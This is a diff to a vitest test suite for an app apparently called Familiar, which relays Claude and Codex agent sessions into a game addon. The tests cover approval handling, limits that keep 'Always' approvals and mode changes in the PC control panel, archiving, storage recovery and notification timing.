@@ -4,10 +4,9 @@
 import * as fs from "node:fs";
 import * as os from "node:os";
 import * as path from "node:path";
-import { beforeEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { activity } from "../src/hub/activity";
 import { describeOverlayAction } from "../src/main/log-file";
-import { createHash } from "node:crypto";
 import { createRequire, syncBuiltinESMExports } from "node:module";
 import { buildSnapshot } from "../src/main/wow";
 import type { AgentBackend, AgentEvent, BackendStatus, Decision, HistoryEntry, Mode, StartOptions, ThreadInfo } from "../src/agents/types";
@@ -23,9 +22,9 @@ const { Hub } = await import("../src/hub/hub");
 const { DEFAULT_CONFIG, loadConfig, saveConfig } = await import("../src/hub/config");
 const { buildModel } = await import("../src/hub/viewmodel");
 const { projectRootOf } = await import("../src/hub/projects");
-const { NO_PROOF } = await import("../src/main/physical");
-/** What main hands the Hub when a decision coincided with a real click (physical.ts). */
-const OK = { ok: true, how: "click" as const };
+const { actKey, NO_PROOF, TOO_SOON, TRUSTED } = await import("../src/main/physical");
+// A decision main has already verified against the Glass and the player's input (physical.ts).
+const OK = TRUSTED;
 
 class FakeBackend implements AgentBackend {
   failOpen = false;
@@ -114,6 +113,7 @@ const tick = () => new Promise((r) => setTimeout(r, 0));
 beforeEach(async () => {
   appData = fs.mkdtempSync(path.join(tmp, "state-"));
   process.env.APPDATA = appData;
+  cfg.quiet = false; // a failed Quiet play test must not mute the rest
   claude = new FakeBackend("claude");
   codex = new FakeBackend("codex");
   hub = new Hub(() => cfg, { claude, codex }, () => {});
@@ -142,29 +142,17 @@ describe("Hub", () => {
     await tick();
     expect(claude.decisions).toEqual([{ requestId: "visible", d: "allow" }]);
     expect(codex.decisions).toEqual([]);
-    // Missing context after a capable key is never treated as legacy, even after a delayed hello.
+    // A key without its view (an old addon's message) decides nothing, on any Hub, before or after a hello.
     (hub as any).lastDecisionAt = 0;
     hub.handleAddon({ t: "key", k: "deny" });
     hub.handleAddon({ t: "hello" });
     hub.handleAddon({ t: "key", k: "deny" });
+    const fresh = new Hub(() => cfg, { claude, codex }, () => {});
+    fresh.threads = hub.threads;
+    fresh.view.selected = selected;
+    fresh.handleAddon({ t: "key", k: "deny" });
     await tick();
     expect(codex.decisions).toEqual([]);
-    // The hello capability independently establishes the same conservative boundary.
-    const capable = new Hub(() => cfg, { claude, codex }, () => {});
-    capable.threads = hub.threads;
-    capable.view.selected = selected;
-    capable.handleAddon({ t: "hello", viewKeys: 1 });
-    capable.handleAddon({ t: "hello" });
-    capable.handleAddon({ t: "key", k: "deny" });
-    await tick();
-    expect(codex.decisions).toEqual([]);
-    // A truly old addon on a fresh Hub retains its existing sole-request fallback.
-    const legacy = new Hub(() => cfg, { claude, codex }, () => {});
-    legacy.threads = hub.threads;
-    legacy.view.selected = selected;
-    legacy.handleAddon({ t: "key", k: "deny" });
-    await tick();
-    expect(codex.decisions).toEqual([{ requestId: "hidden", d: "deny" }]);
   });
 
   it("malformed decision context cannot confirm desktop or held prompts; focus keeps their selected semantics", async () => {
@@ -391,11 +379,15 @@ describe("Hub", () => {
     claude.emit({ type: "delta", threadId: id, itemId: "m1", channel: "text", text: "Hel" });
     claude.emit({ type: "delta", threadId: id, itemId: "m1", channel: "text", text: "lo" });
     expect(hub.threads.get(id)!.entries.at(-1)).toMatchObject({ kind: "assistant", text: "Hello", streaming: true });
+    expect(hub.replyText(id, "a:m1")).toEqual({ text: "Hello", streaming: true }); // "Copy reply" waits for the end
     claude.emit({ type: "message", threadId: id, itemId: "m1", text: "Hello there." });
     claude.emit({ type: "done", threadId: id, status: "completed" });
     const t = hub.threads.get(id)!;
     expect(t.status).toBe("idle");
     expect(t.entries.at(-1)).toMatchObject({ text: "Hello there.", streaming: false });
+    expect(hub.replyText(id, "a:m1")).toEqual({ text: "Hello there.", streaming: false });
+    expect(hub.replyText(id, t.entries[0].id)).toBeUndefined(); // the player's own message is not a reply
+    expect(hub.replyText("q-gone", "a:m1")).toBeUndefined();
     expect(hub.toasts.at(-1)!.kind).toBe("done");
     expect(hub.toasts.at(-1)!.text).toMatch(/^Quest Complete · /);
     expect(hub.toasts.at(-1)!.text).not.toContain("Hello there");
@@ -465,19 +457,33 @@ describe("Hub", () => {
     codex.emit({ type: "approval", threadId: id, requestId: "codex:7", kind: "command", title: "Run command?", detail: "npm test", canAlways: true });
     expect(hub.threads.get(id)!.status).toBe("approval");
     expect(buildModel(hub, { linked: true, fps: 30 }).keys.approve).toBe(true);
-    await hub.key("approve", undefined, "legacy", OK);
+    await hub.key("approve", undefined, "full", OK);
     expect(codex.decisions).toEqual([{ requestId: "codex:7", d: "allow" }]);
     const e = hub.threads.get(id)!.entries.find((x) => x.requestId === "codex:7")!;
     expect(e.approval).toBe("approved");
     expect(hub.threads.get(id)!.status).toBe("running");
   });
 
-  it("card buttons decide a specific request; Always maps to allowAlways", async () => {
+  it("Always is never given from the game; the control panel's Always maps to allowAlways", async () => {
     await hub.quick("claude", "@familiar edit");
     const id = hub.view.selected!;
     claude.emit({ type: "approval", threadId: id, requestId: "claude:a", kind: "tool", title: "Edit?", detail: "-a\n+b", canAlways: true });
     hub.action({ type: "decide", thread: id, requestId: "claude:a", decision: "allowAlways" }, OK);
+    await hub.key("always", undefined, "full", OK);
+    expect(hub.decide(id, "claude:a", "allowAlways")).toEqual({ ok: false, why: "panel" });
+    expect(claude.decisions).toEqual([]);
+    expect(hub.toasts.at(-1)!.text).toMatch(/Always can't be given from the game.*Familiar on your PC/);
+    expect(hub.decide(id, "claude:a", "allowAlways", "panel")).toEqual({ ok: true });
     expect(claude.decisions).toEqual([{ requestId: "claude:a", d: "allowAlways" }]);
+  });
+
+  it("Always on a card that does not offer it (a plan) is a single approval, so the quest never moves to Accept edits", async () => {
+    await hub.quick("claude", "@familiar plan");
+    const id = hub.view.selected!;
+    claude.emit({ type: "approval", threadId: id, requestId: "claude:plan", kind: "planExit", title: "Approve the plan and start implementing?", detail: "1. do it", canAlways: false });
+    expect(hub.decide(id, "claude:plan", "allowAlways", "panel")).toEqual({ ok: true });
+    expect(claude.decisions).toEqual([{ requestId: "claude:plan", d: "allow" }]);
+    expect(hub.threads.get(id)!.mode).toBe("ask");
   });
 
   it("restart guidance observes active quests and every pending request through the existing Hub journey", async () => {
@@ -509,25 +515,31 @@ describe("Hub", () => {
     hub.action({ type: "select", id, entry: item.entry });
     const detail = buildModel(hub, { linked: true, fps: 30 }).detail;
     expect(detail.kind === "thread" && detail.entries.some(e => e.id === item.entry)).toBe(true);
-    await hub.key("approve", undefined, "legacy", OK);
+    await hub.key("approve", undefined, "full", OK);
     expect(claude.decisions).toEqual([{ requestId: "first", d: "allow" }]);
     expect(buildModel(hub, { linked: true, fps: 30 }).attention![0].excerpt).toBe("Second request");
   });
 
-  it("mode cycles Ask first / Plan only from the game, never Accept edits or Auto, and is pushed to the backend; stop interrupts", async () => {
+  it("the control panel sets the open quest's mode and it is pushed to the backend; the Mode key from the game changes nothing; stop interrupts", async () => {
     await hub.quick("claude", "@familiar x");
     const id = hub.view.selected!;
-    await hub.key("mode", undefined, "legacy", OK);
-    expect(hub.threads.get(id)!.mode).toBe("plan");
-    await hub.key("mode", undefined, "legacy", OK);
+    await hub.key("mode", undefined, "full", OK);
     expect(hub.threads.get(id)!.mode).toBe("ask");
-    // A thread set to edits/auto elsewhere (control panel, desktop app) drops back to ask.
-    for (const m of ["auto", "edits"] as const) {
-      hub.threads.get(id)!.mode = m;
-      await hub.key("mode", undefined, "legacy", OK);
-      expect(hub.threads.get(id)!.mode).toBe("ask");
+    expect(hub.toasts.at(-1)!.text).toBe("Modes are changed in Familiar on your PC, not from the game.");
+    for (const m of ["plan", "edits", "auto", "ask"] as const) {
+      expect(hub.setSelectedMode(m, id)).toEqual({ ok: true });
+      expect(hub.threads.get(id)!.mode).toBe(m);
+      await hub.key("mode", undefined, "full", OK);
+      expect(hub.threads.get(id)!.mode).toBe(m);
     }
-    expect(claude.modes).toEqual(["plan", "ask", "ask", "ask"]);
+    expect(hub.setSelectedMode("yolo" as any, id)).toMatchObject({ ok: false });
+    expect(claude.modes).toEqual(["plan", "edits", "auto", "ask"]);
+    // The panel names the quest it showed: one opened in the game since is never changed in its place.
+    await hub.quick("claude", "@familiar another");
+    const other = hub.view.selected!;
+    expect(hub.setSelectedMode("auto", id)).toEqual({ ok: false, why: expect.stringMatching(/Another quest is open/) });
+    expect([hub.threads.get(id)!.mode, hub.threads.get(other)!.mode]).toEqual(["ask", "ask"]);
+    hub.action({ type: "select", id });
     claude.emit({ type: "turnStarted", threadId: id });
     await hub.key("stop");
     expect(claude.interrupted).toEqual([id]);
@@ -617,21 +629,6 @@ describe("Hub", () => {
     const t = hub.selectedThread()!;
     expect(claude.open_.get(t.id)).toMatchObject({ resumeNativeId: "tab", fork: false });
     expect(claude.sent).toEqual([{ threadId: t.id, text: "go on" }]);
-  });
-
-  it("/fam suggest opens a pre-filled issue form (versions only) without corroboration", async () => {
-    const opened: string[] = [];
-    hub.openIssue = (url) => opened.push(url);
-    hub.suggestVersions = () => ({ familiar: "0.1.0", wow: "1.60.2.70500", iface: 16002, windows: "10.0.26200" });
-    await hub.key("suggest", "Let me rename quests", "full", NO_PROOF);
-    expect(opened).toHaveLength(1);
-    const q = new URL(opened[0]).searchParams;
-    expect(q.get("suggestion")).toBe("Let me rename quests");
-    expect(q.get("diagnostics")).toContain("WoW client 1.60.2.70500 (interface 16002)");
-    expect(hub.toasts.at(-1)!.text).toBe("Opened a pre-filled GitHub issue in your browser. Review it and submit there; nothing is sent until you do.");
-    await hub.key("suggest", "", "full", NO_PROOF);
-    expect(opened).toHaveLength(1);
-    expect(hub.toasts.at(-1)!.text).toMatch(/Usage: \/fam suggest/);
   });
 
   it("Continue in <app> hands a finished quest over: Familiar lets go first, then the app opens the same conversation", async () => {
@@ -727,16 +724,16 @@ describe("Hub", () => {
     expect(t.entries.filter((e) => e.kind === "user").map((e) => e.text)).toEqual(["hi", "first", "second", "third"]);
   });
 
-  it("abandon hides a quest, refuses while running, and persists across restarts", async () => {
+  it("archive hides a quest, refuses while running, and persists across restarts", async () => {
     await hub.quick("claude", "@familiar a");
     const id = hub.view.selected!;
     claude.emit({ type: "turnStarted", threadId: id });
-    hub.action({ type: "abandon", id });
+    hub.action({ type: "archive", id });
     expect(hub.threads.has(id)).toBe(true);
     claude.emit({ type: "done", threadId: id, status: "completed" });
     await hub.quick("codex", "@beta b");
     hub.saveNow();
-    hub.action({ type: "abandon", id });
+    hub.action({ type: "archive", id });
     expect(hub.threads.has(id)).toBe(false);
     hub.saveNow();
     const hub2 = new Hub(() => cfg, { claude: new FakeBackend("claude"), codex: new FakeBackend("codex") }, () => {});
@@ -845,12 +842,12 @@ describe("Hub", () => {
     expect(t.lastError).toBeUndefined();
   });
 
-  it("a failed open leaves the quest in error (not stuck running) and Stop/abandon still work", async () => {
+  it("a failed open leaves the quest in error (not stuck running) and Stop/archive still work", async () => {
     codex.failOpen = true;
     await expect(hub.quick("codex", "@familiar x")).rejects.toThrow("boom");
     const t = hub.selectedThread()!;
     expect(t.status).toBe("error");
-    hub.action({ type: "abandon", id: t.id });
+    hub.action({ type: "archive", id: t.id });
     expect(hub.threads.has(t.id)).toBe(false);
   });
 
@@ -908,12 +905,12 @@ describe("Hub", () => {
     claude.emit({ type: "approval", threadId: a, requestId: "claude:1", kind: "tool", title: "?", detail: "", canAlways: false });
     codex.emit({ type: "approval", threadId: b, requestId: "codex:s:1", kind: "command", title: "?", detail: "", canAlways: true });
     hub.view.selected = undefined;
-    await hub.key("approve", undefined, "legacy", OK);
+    await hub.key("approve", undefined, "full", OK);
     expect(claude.decisions.length + codex.decisions.length).toBe(0); // ambiguous
     hub.select(b);
-    await hub.key("approve", undefined, "legacy", OK);
+    await hub.key("approve", undefined, "full", OK);
     expect(codex.decisions).toEqual([{ requestId: "codex:s:1", d: "allow" }]);
-    await hub.key("approve", undefined, "legacy", OK); // double press: debounced, does not approve Claude's request
+    await hub.key("approve", undefined, "full", OK); // double press: debounced, does not approve Claude's request
     expect(claude.decisions).toEqual([]);
   });
 
@@ -1035,9 +1032,33 @@ describe("Hub", () => {
 
   it("the welcome's + Claude / + Codex open the same folder picker as the toolbar keys", async () => {
     hub.action({ type: "start", agent: "codex" });
-    await vi.waitFor(() => expect(hub.view).toMatchObject({ list: "pick", pickAgent: "codex" }));
-    hub.action({ type: "start", agent: "hermes" }); // only Claude and Codex have a picker
+    expect(hub.view).toMatchObject({ list: "pick", pickAgent: "codex" });
+    hub.action({ type: "start", agent: "hermes" }); // not set up here: nothing changes
     expect(hub.view.pickAgent).toBe("codex");
+  });
+
+  it('"+ Quest" starts any familiar that is set up and switched on: key "new" with its id; newClaude / newCodex still work', async () => {
+    const hermes = new FakeBackend("hermes");
+    const providers = cfg.providers;
+    const h = new Hub(() => cfg, { claude, codex, hermes } as any, () => {});
+    try {
+      h.handleAddon({ t: "key", k: "new", a: "hermes", view: "full" });
+      await tick();
+      expect(h.view).toMatchObject({ list: "pick", pickAgent: "hermes" });
+      await h.key("newCodex");
+      expect(h.view.pickAgent).toBe("codex");
+      for (const id of ["grok", "__proto__", "familiar", ""]) {
+        await h.key("new", id);
+        expect(h.view.pickAgent).toBe("codex");
+        expect(h.toasts.at(-1)!.text).toBe("That familiar isn't set up in Familiar on your PC.");
+      }
+      cfg.providers = { ...providers, hermes: { enabled: false } };
+      await h.key("new", "hermes");
+      expect(h.view.pickAgent).toBe("codex");
+      expect(h.toasts.at(-1)!.text).toBe("Hermes is switched off in Familiar's control panel.");
+    } finally {
+      cfg.providers = providers;
+    }
   });
 
   it("backends can report a mode change", async () => {
@@ -1053,11 +1074,14 @@ describe("Hub", () => {
     claude.emit({ type: "turnStarted", threadId: id });
     claude.emit({ type: "todo", threadId: id, items: [{ text: "Read", status: "completed" }, { text: "Fix", status: "in_progress" }] });
     const m = buildModel(hub, { linked: true, fps: 30 });
-    // The Chats zone is always first (with a hint while empty), then zones by activity.
+    // The Chats zone is always first (with a hint while empty), then zones by name, never by activity.
     expect(m.list.rows[0]).toMatchObject({ kind: "zone", text: "Chats" });
     expect(m.list.rows[1]).toMatchObject({ kind: "hint", act: { type: "newIn", key: "chats" } });
-    expect(m.list.rows[2]).toMatchObject({ kind: "zone", text: "familiar" });
-    expect(m.list.rows[3]).toMatchObject({ kind: "thread", text: "one", selected: true });
+    const zones = m.list.rows.filter((r) => r.kind === "zone").map((r) => r.text).slice(1);
+    expect(zones).toEqual([...zones].sort((a, b) => a.localeCompare(b, undefined, { sensitivity: "base", numeric: true })));
+    const fam = m.list.rows.findIndex((r) => r.kind === "zone" && r.text === "familiar");
+    expect(m.list.rows[fam]).toMatchObject({ kind: "zone", text: "familiar", status: "running" });
+    expect(m.list.rows[fam + 1]).toMatchObject({ kind: "thread", text: "one", selected: true });
     expect(m.tracker[0]).toMatchObject({ title: "one", activity: "Fix", progress: "1/2" });
     expect(m.detail.kind).toBe("thread");
   });
@@ -1078,22 +1102,6 @@ describe("Hub", () => {
     expect(line(priced).cost).toBe("<$0.01");
     const detail = model().detail;
     expect(detail.kind === "thread" && detail.usage).toBe("4.0k in · 2.0k out");
-  });
-
-  it("the Mode button's label follows what the Mode key acts on", async () => {
-    const keys = () => buildModel(hub, { linked: true, fps: 30 }).keys;
-    expect(keys().mode).toBeUndefined(); // welcome: the native "Mode" shows
-    await hub.quick("claude", "@familiar labelled");
-    const t = hub.selectedThread()!;
-    expect(keys()).toMatchObject({ mode: "Ask first", modeHot: false });
-    await hub.key("mode", undefined, "full", OK);
-    expect(keys()).toMatchObject({ mode: "Plan only", modeHot: false });
-    t.mode = "auto"; // chosen in the control panel
-    expect(keys()).toMatchObject({ mode: "Auto", modeHot: true });
-    await hub.key("newChat");
-    expect(keys()).toMatchObject({ mode: "Chat", modeHot: false });
-    hub.action({ type: "select", id: "ext:claude:ext-1" });
-    expect(keys().mode).toBeUndefined(); // a desktop thread: Mode has nothing to act on
   });
 
   describe("which desktop threads are listed", () => {
@@ -1124,13 +1132,13 @@ describe("Hub", () => {
       cfg.followDesktopArchive = old;
     });
 
-    it("pin keeps an old thread listed; hide removes one until /fam unhide; both persist", async () => {
+    it("a saved pin keeps an old thread listed; archive removes one until /fam unarchive; both persist", async () => {
       claude.extra.push({ nativeId: "old2", cwd: betaDir, title: "o2", updatedAt: Date.now() - 90 * day });
       hub.pinned.add("claude:old2");
       await hub.refreshExternal();
       expect(ids()).toContain("old2");
       hub.select("ext:claude:fresh");
-      await hub.key("hide");
+      await hub.key("archive");
       expect(ids()).not.toContain("fresh");
       expect(hub.view.selected).toBeUndefined();
       hub.saveNow();
@@ -1138,12 +1146,12 @@ describe("Hub", () => {
       (again as any).load();
       expect([...again.hidden]).toEqual(["claude:fresh"]);
       expect([...again.pinned]).toEqual(["claude:old2"]);
-      await hub.key("unhide");
+      await hub.key("unarchive");
       await tick();
       expect(ids()).toContain("fresh");
     });
 
-    it("quest log: running first, pinned marked, +N more past the per-zone cap, agent filter", async () => {
+    it("quest log: newest first, running never hidden, pinned marked, +N more past the per-zone cap, agent filter", async () => {
       const rowsOf = () => buildModel(hub, { linked: true, fps: 30 }).list.rows;
       const betaRows = () => {
         const rows = rowsOf();
@@ -1152,13 +1160,16 @@ describe("Hub", () => {
         return rows.slice(i + 1, j < 0 ? undefined : j);
       };
       // beta has 4 claude + 1 codex desktop threads.
-      expect(betaRows()[0]).toMatchObject({ kind: "ext", key: "ext:claude:old-running", status: "running" });
+      // Newest first; the two same-titled threads of the same age read their time instead.
+      expect(betaRows().slice(0, 2).map((r) => r.key).sort()).toEqual(["ext:claude:ext-1", "ext:codex:ext-1"]);
+      expect(betaRows()[0].sub).toMatch(/^\d+ \w{3} \d\d:\d\d$/);
       expect(betaRows().find((r) => r.key === "ext:claude:old-starred")!.sub).toMatch(/^★/);
       const old = cfg.externalPerZone;
       cfg.externalPerZone = 2;
-      expect(betaRows().filter((r) => r.kind === "ext")).toHaveLength(2);
+      // Two fit the cap; the running one shows past it.
+      expect(betaRows().filter((r) => r.kind === "ext").map((r) => r.key).slice(2)).toEqual(["ext:claude:old-running"]);
       const more = betaRows().find((r) => r.kind === "hint")!;
-      expect(more).toMatchObject({ text: "+3 more", act: { type: "zoneMore" } });
+      expect(more).toMatchObject({ text: "+2 more", act: { type: "zoneMore" } });
       hub.action(more.act as any);
       expect(betaRows().filter((r) => r.kind === "ext")).toHaveLength(5);
       cfg.externalPerZone = old;
@@ -1446,7 +1457,9 @@ describe("always-on companion and offline honesty", () => {
       expect(repeated.storage?.level).toBe("warn");
       expect(fs.readFileSync(file + ".recovery.2")).toEqual(corrupt);
       expect(fs.existsSync(file + ".recovery.3")).toBe(false);
-      expect(buildSnapshot(repeated)).toContain("Saved quests need attention");
+      // FamiliarSync carries the storage notice only: no quest titles or transcript (owner decision 4).
+      expect(buildSnapshot(repeated)).toMatch(/notice = "Saved quests could not be fully loaded/);
+      expect(buildSnapshot(repeated)).not.toMatch(/first saved quest|First saved response/);
       expect(buildSnapshot(repeated)).toContain("Original bytes are preserved");
       expect(repeated.saveNow()).toBe(true);
       expect(broken.saveNow()).toBe(false); // Its pre-replacement source changed underneath it.
@@ -1475,12 +1488,18 @@ describe("always-on companion and offline honesty", () => {
         } finally { write.mockRestore(); syncBuiltinESMExports(); }
       }
 
+      // Another version's format is kept aside whole and said; Familiar starts without it and saves again.
       const future = Buffer.from(JSON.stringify({ ...saved, version: 2 }));
       fs.writeFileSync(file, future);
       const unsupported = load(); (unsupported as any).load();
-      expect(unsupported.saveNow()).toBe(false);
-      expect(unsupported.storage?.text).toContain("unsupported format");
-      expect(fs.readFileSync(file)).toEqual(future);
+      expect(unsupported.threads.size).toBe(0);
+      expect(unsupported.storage).toMatchObject({ level: "warn", text: expect.stringContaining("format this version of Familiar can't read") });
+      expect(unsupported.storage?.text).not.toContain("threads.json");
+      expect(fs.readFileSync(file + ".recovery.3")).toEqual(future);
+      expect(unsupported.saveNow()).toBe(true);
+      expect(JSON.parse(fs.readFileSync(file, "utf8"))).toMatchObject({ version: 1, threads: [], recovery: { backup: "threads.json.recovery.3", format: "2" } });
+      const restarted = load(); (restarted as any).load();
+      expect(restarted.storage?.text).toContain("format this version of Familiar can't read");
       const badMetadata = Buffer.from(JSON.stringify({ ...saved, view: { collapsed: 7 }, pinned: 42, hidden: {}, archivedInSource: false, acked: "not-an-array" }));
       fs.writeFileSync(file, badMetadata);
       const metadata = load(); (metadata as any).load();
@@ -1488,7 +1507,7 @@ describe("always-on companion and offline honesty", () => {
       expect(metadata.view.collapsed.size).toBe(0);
       expect(metadata.acked).toEqual([]);
       expect(metadata.saveNow()).toBe(true);
-      expect(fs.readFileSync(file + ".recovery.3")).toEqual(badMetadata);
+      expect(fs.readFileSync(file + ".recovery.4")).toEqual(badMetadata);
       expect(JSON.stringify(buildModel(metadata, { linked: true, fps: 30 }).storage)).not.toContain(file);
       expect(metadata.storage?.text).not.toContain("threads.json.recovery");
       const invalidKnownFields = Buffer.from(JSON.stringify({ ...saved, threads: [
@@ -1500,7 +1519,7 @@ describe("always-on companion and offline honesty", () => {
       expect([...knownFields.threads.keys()]).toEqual([firstId, laterId]);
       expect(knownFields.storage?.text).toContain("2 invalid or ambiguous");
       expect(knownFields.saveNow()).toBe(true);
-      expect(fs.readFileSync(file + ".recovery.4")).toEqual(invalidKnownFields);
+      expect(fs.readFileSync(file + ".recovery.5")).toEqual(invalidKnownFields);
     } finally { vi.useRealTimers(); }
   });
 
@@ -1560,7 +1579,9 @@ describe("always-on companion and offline honesty", () => {
       expect(provider.sent).toEqual([]);
       expect(failed.acked).toContain("handled-unsent"); // Handled, not provider acceptance/durability.
       expect(failed.threads.get(id)!.entries.filter(e => e.text === "PRIVATE-UNSENT-WORDS")).toHaveLength(1);
-      expect(buildSnapshot(failed)).toContain("Not sent; this message is currently only in memory");
+      // FamiliarSync says only that saving failed: no message text, quest note or title (owner decision 4).
+      expect(buildSnapshot(failed)).toContain("Recent changes could not be saved");
+      expect(buildSnapshot(failed)).not.toMatch(/PRIVATE-UNSENT-WORDS|Not sent/);
       expect(failed.storage?.level).toBe("error");
       expect(fs.readFileSync(file)).toEqual(healthy);
     } finally { fs.rmdirSync(file + ".tmp"); }
@@ -1576,12 +1597,9 @@ describe("always-on companion and offline honesty", () => {
   });
 
   it("quiet play retains replies and current requests until explicit catch-up, across a restart", async () => {
-    const sounds: string[] = [], spoken: string[] = [];
-    const beforeSpeak = cfg.speak;
-    cfg.speak = true;
+    const sounds: string[] = [];
     hub.onSound = k => sounds.push(k);
-    hub.onSpeak = text => spoken.push(text);
-    await hub.key("quiet", "on");
+    hub.setQuiet(true); // the control panel (Quiet play is not a game setting)
     const ids: string[] = [];
     for (const name of ["first", "second", "pending", "expired"]) {
       await hub.quick("claude", `@familiar ${name}`);
@@ -1596,17 +1614,17 @@ describe("always-on companion and offline honesty", () => {
       }
     }
     const model = () => buildModel(hub, { linked: true, fps: 30 });
-    expect(model().attention?.map(item => item.label).sort()).toEqual(["Needs approval", "Reply waiting", "Reply waiting", "Request expired"].sort());
+    expect(model().attention?.map(item => item.label).sort()).toEqual(["Needs you", "Reply ready", "Reply ready", "Request expired"].sort());
     expect(hub.toasts.some(t => t.kind === "done")).toBe(false);
     expect(sounds).toEqual(["accepted", "accepted", "accepted", "approval", "accepted", "approval"]);
-    expect(spoken).toEqual([]);
     hub.toasts = []; // Simulate toast expiry; the saved events remain.
     hub.action({ type: "select", id: ids[0] });
     expect(model().attention).toHaveLength(4);
     const pending = model().attention!.find(item => item.pending)!;
     hub.action({ type: "caughtUp", thread: pending.thread, entry: pending.entry, revision: pending.revision });
     expect(model().attention).toHaveLength(4); // A required request cannot be dismissed as caught up.
-    await hub.key("caughtup");
+    const reply = model().attention!.find(item => item.thread === ids[0])!;
+    hub.action({ type: "caughtUp", thread: reply.thread, entry: reply.entry, revision: reply.revision });
     expect(model().attention).toHaveLength(3);
     hub.saveNow();
     const again = new Hub(() => cfg, { claude, codex }, () => {});
@@ -1618,54 +1636,44 @@ describe("always-on companion and offline honesty", () => {
     expect(restored.attention?.some(item => item.pending)).toBe(false); // Restart expires old requests.
     hub.action({ type: "decide", thread: ids[3], requestId: "expired", decision: "approved" });
     expect(claude.decisions).toEqual([]);
-    await hub.key("quiet", "off");
+    hub.setQuiet(false);
     expect(model().attention).toHaveLength(3);
     expect(hub.toasts.some(t => t.kind === "done")).toBe(false); // No notification burst on return.
-    cfg.speak = beforeSpeak;
   });
 
   it("notices wait for the fight to end", async () => {
-    const sounds: string[] = [], spoken: string[] = [];
-    const beforeSpeak = cfg.speak;
-    cfg.speak = true;
+    const sounds: string[] = [];
     hub.onSound = (k) => sounds.push(k);
-    hub.onSpeak = (text) => spoken.push(text);
-    try {
-      await hub.quick("claude", "@familiar first");
-      const first = hub.view.selected!;
-      await hub.quick("codex", "@beta second");
-      const second = hub.view.selected!;
-      hub.toasts = []; // the Started toasts
-      hub.setCombat(true);
-      claude.emit({ type: "message", threadId: first, itemId: "m", text: "Done with the first one." });
-      claude.emit({ type: "done", threadId: first, status: "completed" });
-      codex.emit({ type: "approval", threadId: second, requestId: "r1", kind: "command", title: "Run?", detail: "npm test", canAlways: false });
-      expect(hub.toasts).toEqual([]);
-      expect(sounds).toEqual(["accepted", "accepted"]); // the two starts, before the fight
-      expect(spoken).toEqual([]);
-      // The card, the marker and the Approve glow are the model's, and keep updating.
-      const m = buildModel(hub, { linked: true, fps: 30 });
-      expect(m.keys.approve).toBe(true);
-      expect(m.list.rows.find((r) => r.key === first)).toMatchObject({ unread: true });
-      await hub.key("archived"); // a reply to the player's own command still shows
-      expect(hub.toasts.map((t) => t.text)).toEqual(["Nothing is archived."]);
-      hub.setCombat(false);
-      expect(hub.toasts.at(-1)!.text).toBe("While you fought: 1 quest finished · 1 needs approval");
-      expect(hub.toasts.some((t) => t.kind === "approval" && t.threadId === second)).toBe(true);
-      expect(sounds).toEqual(["accepted", "accepted", "approval"]);
-      expect(spoken).toEqual(["While you fought: 1 quest finished, 1 needs approval"]);
-      // One held notice comes back as it was; one decided during the fight doesn't come back.
-      hub.setCombat(true);
-      claude.emit({ type: "done", threadId: first, status: "failed", error: "boom" });
-      codex.emit({ type: "approval", threadId: second, requestId: "r2", kind: "command", title: "Again?", detail: "npm test", canAlways: false });
-      for (const requestId of ["r1", "r2"]) hub.action({ type: "decide", thread: second, requestId, decision: "deny" });
-      hub.setCombat(false);
-      expect(hub.toasts.at(-1)).toMatchObject({ kind: "error", text: "Quest Failed · first" });
-      expect(hub.toasts.filter((t) => t.kind === "approval" && t.threadId === second)).toEqual([]);
-      expect(sounds).toEqual(["accepted", "accepted", "approval", "error"]);
-    } finally {
-      cfg.speak = beforeSpeak;
-    }
+    await hub.quick("claude", "@familiar first");
+    const first = hub.view.selected!;
+    await hub.quick("codex", "@beta second");
+    const second = hub.view.selected!;
+    hub.toasts = []; // the Started toasts
+    hub.setCombat(true);
+    claude.emit({ type: "message", threadId: first, itemId: "m", text: "Done with the first one." });
+    claude.emit({ type: "done", threadId: first, status: "completed" });
+    codex.emit({ type: "approval", threadId: second, requestId: "r1", kind: "command", title: "Run?", detail: "npm test", canAlways: false });
+    expect(hub.toasts).toEqual([]);
+    expect(sounds).toEqual(["accepted", "accepted"]); // the two starts, before the fight
+    // The card, the marker and the Approve glow are the model's, and keep updating.
+    const m = buildModel(hub, { linked: true, fps: 30 });
+    expect(m.keys.approve).toBe(true);
+    expect(m.list.rows.find((r) => r.key === first)).toMatchObject({ unread: true });
+    await hub.key("unarchive"); // a reply to the player's own command still shows
+    expect(hub.toasts.map((t) => t.text)).toEqual(["Nothing is archived."]);
+    hub.setCombat(false);
+    expect(hub.toasts.at(-1)!.text).toBe("While you fought: 1 quest finished · 1 needs you");
+    expect(hub.toasts.some((t) => t.kind === "approval" && t.threadId === second)).toBe(true);
+    expect(sounds).toEqual(["accepted", "accepted", "approval"]);
+    // One held notice comes back as it was; one decided during the fight doesn't come back.
+    hub.setCombat(true);
+    claude.emit({ type: "done", threadId: first, status: "failed", error: "boom" });
+    codex.emit({ type: "approval", threadId: second, requestId: "r2", kind: "command", title: "Again?", detail: "npm test", canAlways: false });
+    for (const requestId of ["r1", "r2"]) hub.action({ type: "decide", thread: second, requestId, decision: "deny" });
+    hub.setCombat(false);
+    expect(hub.toasts.at(-1)).toMatchObject({ kind: "error", text: "Quest Failed · first" });
+    expect(hub.toasts.filter((t) => t.kind === "approval" && t.threadId === second)).toEqual([]);
+    expect(sounds).toEqual(["accepted", "accepted", "approval", "error"]);
   });
 
   it("six cues: accepted on every start, reply for a chat, approved once Approve or Always settles; Deny and refusals are silent", async () => {
@@ -1700,7 +1708,7 @@ describe("always-on companion and offline honesty", () => {
     hub.action({ type: "decide", thread: quest, requestId: "r1", decision: "allow" }, OK);
     expect(at.at(-1)).toMatchObject({ kind: "approved", card: "approved" });
     ask(quest, "r2");
-    hub.action({ type: "decide", thread: quest, requestId: "r2", decision: "allowAlways" }, OK);
+    hub.decide(quest, "r2", "allowAlways", "panel");
     expect(at.at(-1)).toMatchObject({ kind: "approved", card: "always" });
     expect(sounds).toEqual(["approval", "approved", "approval", "approved"]);
     sounds.length = 0;
@@ -1728,7 +1736,7 @@ describe("always-on companion and offline honesty", () => {
     sounds.length = 0;
 
     // Quiet play mutes the chat's reply like the quest's done; notices that need the player stay.
-    await hub.key("quiet", "on");
+    hub.setQuiet(true);
     try {
       await hub.ask("and the chimney?");
       claude.emit({ type: "done", threadId: chat, status: "completed" });
@@ -1736,7 +1744,7 @@ describe("always-on companion and offline honesty", () => {
       ask(quest, "r7");
       expect(sounds).toEqual(["approval"]);
